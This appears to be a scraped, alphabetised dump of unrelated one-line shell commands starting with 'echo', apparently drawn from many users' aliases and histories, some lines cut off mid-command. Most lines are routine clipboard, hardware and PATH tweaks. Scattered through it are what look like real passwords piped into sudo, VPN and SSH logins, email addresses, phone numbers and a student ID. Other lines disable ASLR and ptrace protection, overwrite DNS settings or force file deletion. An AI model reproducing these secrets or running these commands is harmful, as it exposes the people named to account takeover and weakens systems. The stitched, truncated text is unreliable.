echo 🎲 | pbcopy
echo » | pbcopy
echo ¯\\_\(ツ\)_/¯ | xclip -i -selection c
echo ¯\\\_\(ツ\)_/¯ | pbcopy
echo ©® |lolcat -a -d 500
echo |tr -d \
echo |lolcat -a -d 500
echo | xargs -p rm
echo | pbcopy
echo | openssl s_client -tls1_2 -connect
echo | openssl s_client -tls1_1 -connect
echo | openssl s_client -tls1 -connect
echo | openssl s_client -ssl3 -connect
echo | openssl s_client -ssl2 -connect
echo | openssl s_client -dtls1 -connect
echo | openssl s_client -connect
echo | gcc -v -x c -E -
echo | cpp -dM -E -
echo | clipboard
echo | clang -std=c++11 -stdlib=libc++ -v -E -x c++ -
echo | aud [[:space:]]snap clients
echo | aud [[:space:]]nosnap clients
echo | aud [[:space:]]jordan clients
echo | aud [[:space:]]brett clients
echo | aud [[:space:]]ben clients
echo | aud [[:space:]]audit clients
echo | aud [[:space:]]1st.*[[:space:]]snap clients
echo | aud [[:space:]]1st.*[[:space:]]audit clients
echo | aud [[:space:]]1st clients
echo | aud [[:space:]]15th.*[[:space:]]snap clients
echo | aud [[:space:]]15th.*[[:space:]]audit clients
echo | aud [[:space:]]15th clients
echo | aud $2 == 2200 clients
echo {0..1000} | tr [:digit:] '\n' && clear
echo zoommtg://zoom.us/join?confno=9565361682 | pbcopy
echo yes:Telenor 4G-D9BF | sed
echo y | yay -Syu --answeredit n --answerclean n --answerdiff n --sudoloop --noremovemake --combinedupgrade
echo y | vgtest run -t test-ui-env -b chrome -e vg
echo y | rake install[darkstripes]
echo y | git buildkite
echo wyncq9mu | pbcopy
echo wlp2s0 enp3s0f2 | xargs -n1 ip a l dev
echo vagrant-xdebug [enable|disable] vagrant_debug_is_enabled drush_vdebug
echo vadead | sudo -S bash ~/bin/update.sh
echo teste | mail -steste chico.santanna@uol.com.br
echo tert.havkwhaxvr@arg | tr a-z@. n-za-m.@
echo terminal123 | sudo -S killall gnome-software
echo terminal123 | sudo -S /opt/lampp/lampp $1
echo sudo shutdown | ssh nixos
echo stop | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a338000.pru/remoteproc/remoteproc2/state
echo stop | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a334000.pru/remoteproc/remoteproc1/state
echo stats | nc 127.0.0.1 11211
echo startup |sqlplus -L / as sysdba
echo startup quiet|sqlplus -L -s / as sysdba
echo startup quiet |sqlplus -L -s / as sysdba
echo startup nomount |sqlplus -L / as sysdba
echo startup nomount quiet|sqlplus -L -s / as sysdba
echo startup mount |sqlplus -L / as sysdba
echo start | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a338000.pru/remoteproc/remoteproc2/state
echo start | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a334000.pru/remoteproc/remoteproc1/state
echo staging demo production | xargs -n1 -I {} rails looker:git:push_lookml LOOKER_ENV_OVERRIDE={} LOOKER_DB_ENV_OVERRIDE={} AUTO_LOOKML_GENERATION=true LOOKER_USE_SNOWFLAKE=true
echo staging demo production | xargs -n1 -I {} rails looker:git:push_lookml LOOKER_ENV_OVERRIDE={} LOOKER_DB_ENV_OVERRIDE={} AUTO_LOOKML_GENERATION=true
echo shutdown immediate |sqlplus -L / as sysdba
echo shutdown abort|sqlplus -L -s / as sysdba
echo shutdown abort |sqlplus -L / as sysdba
echo set all | nslookup
echo rootDir=/home/test/jddoming/testcases/ | copy
echo qwerty | sudo -S apt-get --install-suggests -y --show-progress install
echo ps -ef | grep airportd / sudo kill -9 PID
echo powersave | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor >/dev/null
echo powersave | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor
echo power on | bluetoothctl
echo power off | bluetoothctl
echo performance | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor >/dev/null
echo performance | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor
echo p | ncmpcpp
echo nicholas.chahley@mail.mcgill.ca | xclip -selection clipboard; echo McGill username copied to clipboard
echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
echo nameserver 8.8.8.8 | sudo tee /etc/resolv.conf
echo n7Dv23kh | pbcopy && firefox 'https://webgate.ec.europa.eu/fpfis/timeclock/timeclock.php'
echo memo: \`psterpng\` | hunho
echo mem | sudo tee /sys/power/state > /dev/null && slock
echo mem | sudo tee /sys/power/state
echo mem | ${SUDO}tee /sys/power/state &> /dev/null;sleep 1;xtrlock &
echo mEaJaNT2 | pbcopy; ssh -Y grp07@argo.ictp.it
echo lisp007tw | sudo -S
echo level disengaged | sudo tee /proc/acpi/ibm/fan # (disengaged)
echo level disengaged | sudo tee /proc/acpi/ibm/fan
echo level auto | sudo tee /proc/acpi/ibm/fan # (automatic - default)
echo level auto | sudo tee /proc/acpi/ibm/fan
echo level 7 | sudo tee /proc/acpi/ibm/fan # (maximum speed)
echo level 7 | sudo tee /proc/acpi/ibm/fan
echo level 4 | sudo tee /proc/acpi/ibm/fan # (medium speed)
echo level 2 | sudo tee /proc/acpi/ibm/fan # (low speed)
echo level 1 | sudo tee /proc/acpi/ibm/fan
echo level 0 | sudo tee /proc/acpi/ibm/fan # (fan off)
echo level 0 | sudo tee /proc/acpi/ibm/fan
echo kern.maxfilesperproc=524288 | sudo tee -a /etc/sysctl.conf
echo kern.maxfiles=524288 | sudo tee -a /etc/sysctl.conf
echo ji |sudo -S ./Documents/java/idea/IntelliJIDEALicenseServer_linux_amd64
echo ji | sudo -S shutdown -h 0
echo ji | sudo -S reboot
echo installed pkgs:; dpkg -l | grep
echo installed pkgs:; dpkg -l | gr
echo include foreman_installer | puppet apply -v --modulepath /usr/share/foreman-installer
echo igso-on | pbcopy
echo https://www.youtube.com/watch?v=IX2EGn7NQI4 | pbcopy
echo http://thepiratebay.se/search/south%20park/0/7/0 | pbcopy
echo http://thepiratebay.se/browse/201/0/7/0 | pbcopy
echo http://p.japh.se && echo http://p.japh.se|xclip
echo http://l.japh.se && echo http://l.japh.se|xclip
echo http://japh.se && echo http://japh.se|xclip
echo http://i.japh.se && echo http://i.japh.se|xclip
echo hi|wc -c
echo here | lmk -
echo grep pixelserv /var/log/messages; tail -f /var/log/messages | grep pixelserv
echo grep include in c files;fffc include | grep
echo get:ip | pbcopy
echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/40-max-user-watches.conf && sudo sysctl --system
echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.conf && sudo sysctl -p && touch /tmp/enospc_done
echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p
echo foo | sudo -S service network-manager restart
echo foo | sudo -S ip li set mtu 1200 dev ppp0
echo flushdb | redis_account
echo flushall | redis-cli
echo flush_all | nc localhost 11211
echo flush_all | nc 127.0.0.1 11211
echo find . -type f -name '*.js' -print0 | xargs -0 sed -i '' -e 's
echo f5fbc906-ff49-4d22-ab7e-d5a5960769fb | pbcopy
echo export $(env | grep SSH_AUTH_SOCK)
echo enable | sudo tee /proc/acpi/ibm/bluetooth
echo enable bluetooth | sudo tee /proc/acpi/ibm/bluetooth
echo druSEqE3 | snx
echo done | mail -s done steven@strobe.cc 8137287254@vtext.com
echo disk | sudo tee /sys/power/state
echo disk used in $PWD:; du -sh | awk
echo disable | sudo tee /proc/acpi/ibm/bluetooth
echo disable bluetooth | sudo tee /proc/acpi/ibm/bluetooth
echo dir | cmd && echo
echo copied to clipboard; ./linux2-x86_64/output/bin/fio-msrv --dump-alert-rules confluence-page | xsel -b
echo connect FC:F1:52:EE:AB:4F | bluetoothctl
echo connect D0:8A:55:33:74:F6 | bluetoothctl
echo connect 5A:5A:5A:5B:00:C8 | bluetoothctl
echo client.focus.minimized = true | awesome-client
echo cd `pwd` | xclip -selection c
echo cd `pwd` | pbcopy
echo c+kvC\(22*+r6 | pbcopy; ssh -X -C ctb19335@ssh-ccub.u-bourgogne.fr
echo c | beet play year+ album+ track+
echo bdd_path123 | sudo -S ~/jetson_clocks.sh
echo bdd_path123 | sudo -S ~/git/postFlashTX1/createSwapfile.sh -d /media/ubuntu/rosbags/ -s 8
echo bNmDwUaF;echo bNmDwUaF|xsel; ssh fusionservice@10.50.141.154
echo awesome.restart() | awesome-client
echo acer | please -S killall VDCAssistant
echo a2|sudo /usr/libexec/locate.updatedb
echo `wget -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'`
echo `uname -a | cut -f2 -d' '`
echo `pwd` | xclip -selection clipboard
echo `pwd` | pbcopy
echo `ls -t | head -n 1`
echo `ls -1 /var/log/apache2/error* | tail -n 1`
echo `ls -1 /var/log/apache2/access* | tail -n 1`
echo `ipconfig getifaddr en0` | pbcopy
echo `ifconfig $(netstat -nr | grep -e default -e
echo `hostname`:`pwd` | sed -e
echo `history 2 | head -1` \<- $@ >> ${NIFTY}
echo `gpgkey2ssh 2190701CC614FD52` | cb
echo `git symbolic-ref HEAD 2>/dev/null | cut -d '/' -f 3`
echo `git rev-parse --abbrev-ref HEAD` | xargs -I {} sh -c '[[ {} != \
echo `getvalue root` | sudo apt-get install
echo `current_git_branch` | pbcopy
echo `current_branch` | pbcopy
echo `cbr` | pbcopy
echo `cat /sys/class/power_supply/BAT1/energy_now` / `cat /sys/class/power_supply/BAT1/energy_full` \* 100 | bc -l
echo `</dev/random tr -dc A-Za-z0-9 | head -c8`
echo \${PATH} | tr -s ':' '\n'
echo \$STY | sed 's/^[^.]*\.//'
echo \$PWD | xsel -b
echo \$PWD | xclip -i
echo \$PWD | \$CLIPBOARD_COPY
echo \$PATH |sed 's/\:/\n/g'
echo \$PATH | tr : '\n'
echo \$PATH | tr : '\012'
echo \$PATH | tr -s ':' '\\n'
echo \$PATH | tr ':' '\n'
echo \$PATH | tr ':' '\012'
echo \$PATH | sed 's/:\//\n\//g'
echo \$PATH | sed 's/:/\n/g'
echo \$PATH | sed 's/:/\\n/g'
echo \$PATH | awk -F: -v OFS=
echo \$PATH | awk -F ':' '{for (i=1;i<NF;i++){print \$i}}'
echo \$PASS | sudo -S npm install -g --unsafe-perm
echo \$PASS | sudo -S npm -g outdated
echo \$GEM_PATH | tr ':' '\n'
echo \$FPATH | sed 's/:\//\n\//g'
echo \$CLASSPATH | perl -pe 's/;/\n/g'
echo \$(tr -dc A-Za-z0-9 < /dev/urandom | head -c\$(tput cols))
echo \$(pwd) | tr -d \
echo \$(ls -Ahl | wc -l)
echo \$($REMOTE_ORIGIN_URL | sed -E '$REPONAME_PN')
echo \$$var | tr ':' '\n'
echo \$ pzudata | ftp 10.244.28.4
echo \$ pzudata | ftp 10.243.216.185
echo \$ pzdsql | ftp 10.244.28.4
echo \$ pzdsql | ftp 10.243.216.185
echo \$ pzdsh | ftp 10.244.28.4
echo \$ pzdsh | ftp 10.243.216.185
echo \$ pzddata | ftp 10.244.28.4
echo \$ pzddata | ftp 10.243.216.185
echo \$ pzdaindout | ftp 10.243.216.185
echo \$ pzdacrmrunsql | ftp 10.243.216.185
echo \$ local_38_ftp_211| ftp -i 10.244.28.38
echo \$ local_284_ftp_211| ftp 10.244.28.4
echo \""^\"" = Ctrl, \""+\"" = Escape) | quotation-highlight "
echo \!* | spell
echo Y | rm
echo WARNING: hardcoded to xxpcx; git branch | grep xxpcx
echo Ubuntu|lolcat -a -d 500
echo UPDATESTARTUPTTY | gpg-connect-agent >/dev/null && /usr/bin/git
echo UPDATESTARTUPTTY | gpg-connect-agent
echo The first one is the name server that its looking it up against; echo The second one is the IP of the address youve looked up; hostname | nslookup
echo Show R/W speeds | pv -qL 10 && dd bs=1000000 count=100 if=/dev/zero of=testfile & speedometer testfile
echo SVNVersion...;svn --version | head -1;echo SVNInfo...;svn info;
echo Running git fetch...; gf; echo; echo; echo Running git branch -vv; gb -vv|grep -e behind -e ahead
echo RELOADAGENT | gpg-connect-agent
echo PATH=$PATH | more
echo LD_LIBRARY_PATH :; echo -n ' ';echo \$LD_LIBRARY_PATH |sed 's/:/\n /g'
echo KILLAGENT | gpg-connect-agent && gpg-connect-agent /bye; gpgconf --kill gpg-agent
echo INTERNAL && ifconfig | grep 'inet ' && echo PUBLIC && echo ' ' \`dig +short myip.opendns.com @resolver1.opendns.com\`
echo Herby | sudo yum upgrade
echo Herby | sudo yum update
echo GIT_AUTHOR_NAME: $GIT_AUTHOR_NAME \| GIT_AUTHOR_EMAIL: $GIT_AUTHOR_EMAIL
echo File: `ls -l|\grep
echo Displaying Upload Speed Graph | pv -qL 10 && speedometer -tx eth0
echo Displaying Download Speed Graph| pv -qL 10 && speedometer -rx eth0
echo Directory: `ls -l|\grep
echo Dimitri Jeremi JC Geoffrey |xargs shuf -n 1 -e
echo Did you mean 'vim'? | lolcat -h 1.0; sleep 0.5; vim
echo Cycles: `ioreg -l | grep 'BatteryInfo\
echo Command exited code $? | sendmail 8479036389@txt.att.net
echo Clipping path:;path; pwd | tr \
echo C545C672-8E36-42BB-AC0B-A0DE00A1F5D3 | pbcopy
echo AUF-F-4060465 | xclip -sel clip
echo <password>|sudo -S poweroff -p
echo <password>|sudo -S pm-suspend
echo <password>|sudo -S pm-hibernate
echo <password>|sudo -S fdisk -l
echo ::memstat | mdb -k
echo 9999 | sudo tee /proc/sys/fs/inotify/max_user_watches
echo 954 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 937 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 900 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 87Z/ZceD;echo 87Z/ZceD|xsel; ssh fusionservice@10.50.141.152
echo 848 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 800 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 75 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 742 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 65536 | sudo tee -a /proc/sys/fs/inotify/max_user_watches"
echo 65 | sudo tee /proc/sys/net/ipv4/ip_default_ttl
echo 636 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 6 | sudo tee /sys/class/backlight/acpi_video0/brightness
echo 530 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 500000 | sudo tee /proc/sys/kernel/perf_event_max_sample_rate
echo 500 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 5 | sudo tee /sys/class/backlight/acpi_video0/brightness
echo 4794 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 424 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 400 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 4 | publishhelper.sh
echo 32768 | sudo tee -a /proc/sys/fs/inotify/max_queued_events &&
echo 318 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 3 |sudo tee /proc/sys/vm/drop_caches
echo 3 | sudo update-alternatives --config javaws >/dev/null 2>&1
echo 3 | sudo update-alternatives --config javac >/dev/null 2>&1
echo 3 | sudo update-alternatives --config java >/dev/null 2>&1
echo 3 | sudo tee /sys/class/leds/asus::kbd_backlight/brightness
echo 3 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null
echo 3 | sudo tee /proc/sys/vm/drop_caches &> /dev/null
echo 3 | sudo tee /proc/sys/vm/drop_caches
echo 3 | sudo tee -a /proc/sys/vm/drop_caches
echo 3 | publishhelper.sh
echo 260865097 | xclip -selection clipboard; echo McGill ID copied to clipboard
echo 255 | sudo tee /sys/class/leds/tpacpi\:\:thinklight/brightness
echo 2300 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 2147483647 | pbcopy
echo 212 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 200 | sudo tee /sys/class/backlight/radeon_bl0/brightness
echo 200 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 2 | sudo update-alternatives --config javaws >/dev/null 2>&1
echo 2 | sudo update-alternatives --config javac >/dev/null 2>&1
echo 2 | sudo update-alternatives --config java >/dev/null 2>&1
echo 2 | sudo tee /sys/module/hid_apple/parameters/fnmode
echo 2 | sudo tee /sys/class/leds/asus\:\:kbd_backlight/brightness
echo 2 | sudo tee /sys/class/leds/asus::kbd_backlight/brightness
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
echo 2 | sudo tee -a /proc/sys/vm/drop_caches
echo 2 | sudo tee -a /proc/sys/kernel/randomize_va_space
echo 2 | publishhelper.sh -d
echo 2 | publishhelper.sh
echo 1N4AL3APXEC320737 | pbcopy
echo 192.168.0.{1..255} | xargs -n1 ping -c1
echo 139NZS2LKViadDXWCndk3HHNWyNkVkw2VG | xsel -b
echo 128.31.25.99 | pbcopy
echo 123 | sudo -S python /opt/goagent-3.0/local/proxy.py
echo 123 | pbcopy; ssh -Y gysomate@10.243.6.78
echo 1060 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 106 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 1011|sudo -S apt-get update
echo 100000|sudo tee /proc/sys/fs/inotify/max_user_watches
echo 100 | sudo tee /sys/class/backlight/radeon_bl0/brightness
echo 10 | sudo tee /sys/class/backlight/intel_backlight/brightness
echo 1 | sudo update-alternatives --config javaws >/dev/null 2>&1
echo 1 | sudo update-alternatives --config javac >/dev/null 2>&1
echo 1 | sudo update-alternatives --config java >/dev/null 2>&1
echo 1 | sudo tee > /proc/sys/vm/drop_caches
echo 1 | sudo tee /sys/module/hid_apple/parameters/iso_layout
echo 1 | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo
echo 1 | sudo tee /sys/devices/platform/sony-laptop/kbd_backlight
echo 1 | sudo tee /sys/class/leds/led1/brightness
echo 1 | sudo tee /sys/class/leds/led0/brightness
echo 1 | sudo tee /sys/class/leds/asus::kbd_backlight/brightness
echo 1 | sudo tee /sys/bus/usb/devices/1-5/bConfigurationValue
echo 1 | sudo tee /sys/bus/pci/rescan
echo 1 | sudo tee /proc/sys/vm/drop_caches
echo 1 | sudo tee -a /proc/sys/vm/drop_caches
echo 1 | sudo tee -a /proc/sys/vm/compact_memory > /dev/null
echo 1 | sudo -S shutdown now
echo 1 | publishhelper.sh && cd /c/inetpub/wwwroot/Jobs && sed -i
echo 1 | publishhelper.sh
echo 1 | nc 127.0.0.1 4321
echo 0xD37E8d2F0b02C15c7b9d6A6773dC5Ec98F6517C8 | pbcopy
echo 021b9155eaa9b5f7ae14a5ebb0a6f1ce2a36484b759d71b2d909fd8060c83b9e | xclip -selection c
echo 0000 01234567890123456789012345678901234567890123456789012345678901234567890123456789\|0000 01234567890123456789012345678901234567890123456789012345678901234567890123456789
echo 0 | sudo tee /sys/module/hid_apple/parameters/iso_layout
echo 0 | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo
echo 0 | sudo tee /sys/devices/platform/sony-laptop/kbd_backlight
echo 0 | sudo tee /sys/class/leds/tpacpi\:\:thinklight/brightness
echo 0 | sudo tee /sys/class/leds/led1/brightness
echo 0 | sudo tee /sys/class/leds/led0/brightness
echo 0 | sudo tee /sys/class/leds/asus\:\:kbd_backlight/brightness
echo 0 | sudo tee /sys/class/leds/asus::kbd_backlight/brightness
echo 0 | sudo tee /sys/bus/usb/devices/1-5/bConfigurationValue
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
echo 0 | sudo tee -a /sys/class/leds/smc::kbd_backlight/brightness
echo 0 | sudo tee -a /proc/sys/kernel/randomize_va_space
echo /usr/share/sounds/alsa/Front_* | xargs -n 1 paplay -v
echo /usr/ports/*/*|tr ' ' '\n'
echo /routes|nc 127.0.0.1 2006
echo /proj/gateway4/products/`pwd | cut -d
echo /nhdpinfo link | nc 127.0.0.1 2009
echo /netjsoninfo filter graph ipv6_0 | nc 127.0.0.1 2009
echo /netjsoninfo filter graph ipv4_0 | nc 127.0.0.1 2009
echo /neighbors|nc 127.0.0.1 2006
echo /links |nc 127.0.0.1 2006
echo /home/test/jddoming/testcases/test_echo.py | copy
echo /export/home/ftarroux/svn_extract/v25dev | ns_instal.unix
echo /etc/ssh/ssh_host_*_key.pub | xargs -n1 ssh-keygen -l -f
echo -ne 'ñ' | cclip
echo -ne '\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A############################ start ##################################\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A' && git diff --color | diff-so-fancy
echo -ne '\e]52;0;'; base64 | tr -d '\012'; echo -ne '\e\\'
echo -n ಠ_ಠ | pbcopy && echo 'ಠ_ಠ copied to clipboard'
echo -n ಠ_ಠ | LANG=en_US.UTF-8 pbcopy
echo -n ¯\\\_\(ツ\)_/¯ | pbcopy
echo -n ~/code/KeePass/local.key|pbcopy && open -n /Applications/KeePassX.app ~/code/KeePass/local.kdb
echo -n | xclip -selection clipboard
echo -n | xclip -display :0 -selection clipboard
echo -n | sudo tee /var/log/nginx/kataribe.log
echo -n | hoq
echo -n | co
echo -n | base64 <<<
echo -n mem | sudo tee /sys/power/state
echo -n disk | sudo tee /sys/power/state
echo -n date | shasum -a 256
echo -n d | nmon -s 1
echo -n `uuid` | pbcopy
echo -n `pwd`|pbcopy
echo -n `pwd` | xsel
echo -n `pwd` | tocp
echo -n `pwd` | pbcopy;echo “copied path:”;pwd
echo -n `pwd` | pbcopy; echo \
echo -n `pwd` | pbcopy
echo -n `oathtool --totp $HASH_FOR_VPN_TOKEN` | tee >(pbcopy)
echo -n `ipconfig getifaddr en0` | tee >(pbcopy)
echo -n `git rev-parse --abbrev-ref HEAD` | pbcopy
echo -n `fc -ln -1` | pbcopy
echo -n `curl -s ipecho.net/plain` | tee >(pbcopy)
echo -n \¯\\\_\(\ツ\)\_\/\¯ | xclip -sel clipboard
echo -n \`pwd\` | xsel -p
echo -n \`pwd\` | xsel -b
echo -n \$PWD | xclip -i
echo -n Emptying the Trash | pv -qL 10 && \rm -rf ~/.local/share/Trash/files/*
echo -n Americold1999 | sudo openconnect --user=jmcdonald --passwd-on-stdin vpn.americold.com
echo -n @norm yes deploy ecs worker|pbcopy
echo -n @norm no deploy ecs worker|pbcopy
echo -n @norm ecs deploy staging develop|pbcopy
echo -n @norm ecs deploy staging $(git rev-parse --symbolic-full-name --abbrev-ref HEAD)|pbcopy
echo -n @norm ecs deploy production master|pbcopy
echo -n @norm ecs deploy production $(git rev-parse --symbolic-full-name --abbrev-ref HEAD)|pbcopy
echo -n @norm ecs build staging develop|pbcopy
echo -n @norm ecs build staging $(git rev-parse --symbolic-full-name --abbrev-ref HEAD)|pbcopy
echo -n @norm ecs build production $(git rev-parse --symbolic-full-name --abbrev-ref HEAD)|pbcopy
echo -n 36dab7442fa26bb6|xsel --clipboard; echo copied to clipboard: ; xsel --clipboard --output; echo
echo -n 'ಠ_ಠ' | pbcopy
echo -n 'ᕙ(⇀‸↼‶)ᕗ' | xclip && echo 'Copied \
echo -n 'ᕙ(⇀‸↼‶)ᕗ' | pbcopy && echo 'Copied \
echo -n '¯\_(ツ)_/¯' | xclip && echo 'Copied \
echo -n '¯\_(ツ)_/¯' | pbcopy && echo 'Copied \
echo -n '¯\_(ツ)_/¯' | pbcopy
echo -n '¯\_( ˘͡ ˘̯)_/¯' | xclip && echo 'Copied \
echo -n '¯\_( ˘͡ ˘̯)_/¯' | pbcopy && echo 'Copied \
echo -n '¯\\\_(ツ)\_/¯' | pbcopy && echo 'Copied \
echo -n '¯\\\\\\_(ツ)\_/¯' | xclip && echo 'Copied \
echo -n '¯\\\\\\_(ツ)\_/¯' | pbcopy && echo 'Copied \
echo -n '¯\(°_o)/¯' | pbcopy
echo -n 'username=admin&password=SuperSecretPassword' | http --form $GOOF_HOST/admin -v
echo -n 'o_O' | pbcopy
echo -n 'ka7pg8s3577ckkpwnjzdbr2eMXybDMQWyJ$(date +%s)' | shasum -a 256
echo -n 'c[_]' | pbcopy
echo -n '\e[1;32mListing connected drives:\e[0m\n' | pv -qL 10 && lsblk -f
echo -n '\e[1;32mListing Installed AUR packages:\e[0m\n '| pv -qL 20 && pacman -Qqm
echo -n '\(ˆ˚ˆ)/' | pbcopy
echo -n '[¬º-°]¬' | pbcopy
echo -n ':e ' | nvim
echo -n '(ノಠ益ಠ)ノ彡┻━┻' | pbcopy
echo -n '(╭☞\'ω\')╭☞' | pbcopy && echo 'Copied \
echo -n '(╭☞'ω')╭☞' | xclip && echo 'Copied \
echo -n '(╯°□°）╯︵ ┻━┻' | xclip && echo 'Copied \
echo -n '(╯°□°）╯︵ ┻━┻' | pbcopy && echo 'Copied \
echo -n '(╯°□°）╯︵ ┻━┻' | pbcopy
echo -n '(´▽\`ʃƪ)' | pbcopy && echo 'Copied \
echo -n '' | pbcopy
echo -n ${PWD/ /\\ } | xclip -sel c -r
echo -n ${GILT_GUID} | pbcopy -Prefer txt && pbpaste && echo ' copied to pasteboard'
echo -n $corra | pbcopy
echo -n $REDIS_TOKEN | pbcopy
echo -n $PWD|pbcopy
echo -n $PWD | xsel -bi
echo -n $PWD | xsel -b && pwd
echo -n $PWD | xclip -selection c
echo -n $PWD | xclip
echo -n $PWD | pbcopy
echo -n $PWD | cclip
echo -n $OTEPASS | pbcopy
echo -n $DUCK_EXTERNAL | sudo cryptsetup luksOpen --key-file=/home/fradeve/.keys/duck_external_keyfile /dev/sda duck-external
echo -n $DOCKER_PASSWORD | xclip -selection clipboard
echo -n $(uuidgen) | pbcopy
echo -n $(pwgen 20 -1) | xsel --input --clipboard
echo -n $(pwgen -sn 20 1) | xclip -sel clip
echo -n $(pwd)/ | pbcopy
echo -n $(pwd) |xclip -selection clipboard
echo -n $(pwd) | xsel -b -i
echo -n $(pwd) | xclip -selection c
echo -n $(pwd) | pbcopy
echo -n $(pwd) | clip-set
echo -n $(pwd) | clip
echo -n $(git rev-parse --abbrev-ref HEAD) | pbcopy
echo -n $(fc -ln -1) | pbcopy
echo -en `pwd`/ | xclip -selection clipboard
echo -en `pwd`/ | pbcopy
echo -en '\x07\x00' | nc -u $LIGHT_IP $LIGHT_PORT
echo -en '\x02\x00' | nc -u $LIGHT_IP $LIGHT_PORT
echo -en '\033[1;33m' && pwd | sed 's/\/home\/heebum/~/' && echo -en '\033[0m' && ls --color=auto
echo -en '\033[1;33m' && pwd | sed 's/\/Users\/heebum/~/' && echo -en '\033[0m' && ls -G
echo -e compressed: $(gzip -c $1 | wc -c)\n normal: $(du -sch $1)
echo -e \n | /opt/pycharm/bin/pycharm.sh
echo -e \`cat ~/notiz.txt | grep -v '^#.*$'\`
echo -e \${PATH//:/\\\n} | sort
echo -e \$(iw wlp2s0 info | awk '/\t*ssid/ { sub(\
echo -e 'power on\nquit'|bluetoothctl
echo -e 'power on\ndisconnect\nconnect 88:C6:26:6F:50:09\nquit'|bluetoothctl
echo -e 'power on\ndisconnect\nconnect 1C:48:F9:9D:BE:04\nquit'|bluetoothctl
echo -e 'power on\nconnect 28:9A:4B:20:07:16\nquit' | bluetoothctl
echo -e 'power on\nconnect 00:42:79:AF:85:C9\n' | bluetoothctl
echo -e 'power off\nquit'|bluetoothctl
echo -e 'disconnect 5C:EB:68:44:04:98' | bluetoothctl
echo -e 'disconnect 00:87:63:11:19:1D \n quit' | bluetoothctl && mute
echo -e 'disconnect 00:42:79:AF:85:C9\npower off\n' | bluetoothctl
echo -e 'connect 5C:EB:68:44:04:98' | bluetoothctl
echo -e 'connect 00:87:63:11:19:1D \n quit' | bluetoothctl && sleep 2 && mute && $HOME/script/audio-raise-vol.sh 14
echo -e 'Find Files older than 1 day\n' echo 'find . -mtime -1 | xargs tar --no-recursion -czf myfile.tgz'
echo -e ${PATH//:/\\n} |sort
echo -e ${PATH//:/\\n} | uniq
echo -e ${PATH//:/\\n} | sort -u
echo -e ${PATH//:/\\n} | sort
echo -e ${PATH//:/\\n} | nl
echo -e ${PATH//:/\\n} | less -iFNQRX
echo -e ${PATH//:/\\n} | lc-gradient --seed=8
echo -e ${PATH//:/\\n} | grep . --color=never
echo -e ${PATH//:/\\n} | cat -n
